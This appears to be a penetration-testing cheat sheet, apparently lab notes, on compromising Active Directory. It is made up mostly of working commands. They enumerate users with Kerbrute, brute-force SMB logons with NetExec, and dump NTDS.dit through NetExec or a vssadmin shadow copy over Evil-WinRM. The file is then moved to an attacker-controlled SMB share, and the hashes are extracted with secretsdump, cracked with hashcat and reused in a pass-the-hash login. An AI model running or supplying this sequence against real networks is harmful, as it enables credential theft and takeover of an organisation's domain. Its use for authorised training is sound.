# Active Directory CReds and NTDS.dit

## Username dictionary attacks against AD accounts

### Creating a custom list of usernames

Create a list of usernames knowing common naming conventions --> names.txt --> automated list generator

- [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
- [Kerbrute](https://github.com/ropnop/kerbrute)

```bash
# Anarchy
./username-anarchy -i /home/ltnbob/names.txt 

# Enumerate valid names with Kerbrute
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain example.local names.txt
```

### Launching a brute-force attack with NetExec

Use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller.

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

## Capturing NTDS.dit

- [Pentest Everythng - NTDS](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/ntds)
- %systemroot%/ntds

### Fast method: Using NetExec to capture NTDS.dit

```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

### Connecting to a DC with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

To make a copy of the NTDS.dit file, we need local admin.

```powershell
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

# Checking local group membership
net localgroup

# Checking user account privileges including domain
net user bwilliamson

# Creating shadow copy of C:
vssadmin CREATE SHADOW /For=C:

# Copying NTDS.dit from the VSS
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

#### Transferring NTDS.dit to attack host

```bash
# Mount local share on attack box
sudo smbserver.py -smb2support CompData /home/ltnbob/Documents/

# Back to evil
C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### Extracting hashes from NTDS.dit

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## Cracking hashes and gaining credentials

Create a text file with all the hashes - or do one at a time

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Pass the Hash (PtH) considerations

PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM uses an encrypted challenge,to the secured NTLM credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. 

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```



